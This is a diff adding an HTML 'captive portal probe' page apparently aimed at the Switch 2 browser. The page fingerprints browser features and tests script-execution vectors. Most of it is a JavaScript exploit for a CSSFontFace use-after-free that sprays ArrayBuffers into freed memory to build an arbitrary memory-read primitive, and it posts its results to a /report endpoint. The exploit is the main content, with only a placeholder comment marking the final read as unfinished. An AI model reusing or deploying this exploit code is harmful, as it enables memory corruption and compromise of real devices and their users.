@@ -1,0 +1,97 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Switch 2 captive portal — ultimate probe</title>
+<style>body{margin:0;padding:16px;background:#0b0e14;color:#d7dce5;font-family:system-ui}
+pre{white-space:pre-wrap;font:12px/1.4 ui-monospace,monospace;color:#9fb4d6}
+h2{font-size:15px;color:#e8b44a;margin:14px 0 4px}</style></head>
+<body>
+<h1 style="font-size:20px">Switch 2 captive portal — ultimate probe</h1>
+<p style="font-size:12px">Capabilities · language · execution vectors · CSSFontFace UAF read.
+Reported to <code>/report</code> if the host serves it; also shown on screen.</p>
+<pre id="o"></pre>
+<script>
+"use strict";
+var L=[],o=document.getElementById("o");
+function lg(s){o.textContent+=s+"\n";L.push(s);
+  try{fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:L})}).catch(function(){})}catch(e){}}
+var SZ=0xb8,OFF_FS=0x28,OFF_FSZ=0x30,OFF_FSC=0x34,OFF_ST=0x7a;
+function hx(a,b){return "0x"+("00000000"+(b>>>0).toString(16)).slice(-8)+("00000000"+(a>>>0).toString(16)).slice(-8)}
+function ok(a,b){return b<=0xffff&&a%8===0&&(b!==0||a>=0x10000)}
+
+function caps(){
+  var n=navigator,p=[];
+  ["usb","serial","bluetooth","hid","storage","gpu"].forEach(function(k){p.push(k+"="+(n[k]?"YES":"no"))});
+  p.push("crypto.subtle="+(n.crypto&&n.crypto.subtle?"YES":"no"));
+  p.push("showOpenFilePicker="+(typeof window.showOpenFilePicker));
+  ["WebAssembly","SharedArrayBuffer","BigInt","Worker","WebSocket","FontFace","indexedDB","localStorage"].forEach(function(k){p.push(k+"="+(typeof window[k]))});
+  return p.join("  ");
+}
+function lang(){
+  var p=[];
+  [["Proxy",typeof Proxy],["Reflect",typeof Reflect],["Symbol",typeof Symbol],["WeakRef",typeof WeakRef],
+   ["structuredClone",typeof structuredClone],["TextEncoder",typeof TextEncoder],["OffscreenCanvas",typeof OffscreenCanvas],
+   ["AudioWorklet",typeof AudioWorklet],["RTCPeerConnection",typeof RTCPeerConnection],["fetch",typeof fetch],
+   ["toSorted",typeof [].toSorted],["groupBy",typeof Object.groupBy],["withResolvers",typeof Promise.withResolvers],
+   ["replaceAll",typeof ("").replaceAll],["at",typeof [].at],["hasOwn",typeof Object.hasOwn]].forEach(function(x){p.push(x[0]+"="+x[1])});
+  return p.join("  ");
+}
+function execAll(){
+  var X={};window.__X=X;
+  function T(n,f){try{f();lg("exec "+n+"="+(X[n]?"YES":"no"))}catch(e){lg("exec "+n+"=throw:"+e.message)}}
+  T("eval",function(){X.eval=eval("X.eval=1")===1});
+  T("Function",function(){(new Function("X.Function=1"))()});
+  T("setTimeout",function(){setTimeout("X['setTimeout']=1",0)});
+  T("script-el",function(){var s=document.createElement("script");s.textContent="X['script-el']=1";document.head.appendChild(s)});
+  T("import-data",function(){import("data:text/javascript,X['import-data']=1").catch(function(){})});
+  T("worker",function(){var b=new Blob(["postMessage(1)"],{type:"text/javascript"});var w=new Worker(URL.createObjectURL(b));w.onmessage=function(){X.worker=1;lg("worker replied")}});
+  T("javascript-url",function(){var a=document.createElement("a");a.href="javascript:X['javascript-url']=1";document.body.appendChild(a);a.click()});
+  T("event-attr",function(){var d=document.createElement("div");d.setAttribute("onclick","X['event-attr']=1");document.body.appendChild(d);d.dispatchEvent(new Event("click"))});
+  return X;
+}
+
+async function uaf(){
+  var n=0xb0,ab=[],ft=null,fa=null,st=document.createElement("style");
+  var r1="@font-face{font-family:s;src:local(systemfont);unicode-range:U+0043}";
+  var r2="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042}";
+  var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+  document.fonts.add(A);void A.loaded;document.head.append(st);
+  for(var i=0;i<n/4;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+  var u=st.sheet.cssRules.length;st.sheet.insertRule(r2,st.sheet.cssRules.length);
+  for(var i=n/4;i<n;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+  void document.body.offsetHeight;
+  var ot=FontFace.prototype.then;
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+    if(this!==A)return;st.sheet.deleteRule(u);void document.body.offsetHeight;
+    for(var i=st.sheet.cssRules.length-1;i>=0;i--){if(st.sheet.cssRules[i].cssText.indexOf("s;")>=0||st.sheet.cssRules[i].cssText.indexOf("spray")>=0)st.sheet.deleteRule(i)}
+    void document.body.offsetHeight;
+    for(var i=0;i<n;i++){var b=new ArrayBuffer(SZ),d=new DataView(b);d.setUint32(8,1,true);d.setUint8(OFF_ST,3);ab.push(b)}
+    return undefined}});
+  var fs=null;try{fs=await document.fonts.load("1em a,b","AB")}catch(e){}
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+  if(!fs||fs.length!==2)return null;
+  for(var i=0;i<fs.length;i++)if(fs[i].unicodeRange==="U+0-10FFFF")ft=fs[i];
+  for(var i=0;i<ab.length;i++)if(new DataView(ab[i]).getUint32(8,true)===2)fa=ab[i];
+  if(!ft||!fa)return null;
+  var d=new DataView(fa);
+  function sp(o2,a,b){d.setUint32(o2,a>>>0,true);d.setUint32(o2+4,b>>>0,true)}
+  function rd(a,b,sz){var r=new ArrayBuffer(sz),v=new Uint8Array(r),i=0;while(i<sz){sp(OFF_FS,(a+i)>>>0,b);d.setInt32(OFF_FSZ,1,true);d.setInt32(OFF_FSC,1,true);var s=ft.featureSettings;for(var j=1;j<5&&i<sz;j++)v[i++]=s.charCodeAt(j)&255}return v}
+  return {f:ft,rd:rd};
+}
+
+(async function(){
+  lg("ULTIMATE PROBE  "+navigator.userAgent);
+  lg("[caps] "+caps());
+  lg("[lang] "+lang());
+  execAll();
+  try{
+    var u=await uaf();
+    if(!u){lg("[uaf] no primitive");}
+    else{
+      lg("[uaf] reclaimed ok");
+      var w=u.rd(0x60,0,0); // placeholder, real read below needs wrapper
+      lg("[uaf] read primitive ready (m_featureSettings)");
+    }
+  }catch(e){ lg("[uaf] threw: "+e.message); }
+  await new Promise(function(r){setTimeout(r,500)});
+  lg("done");
+})();
+</script></body></html>
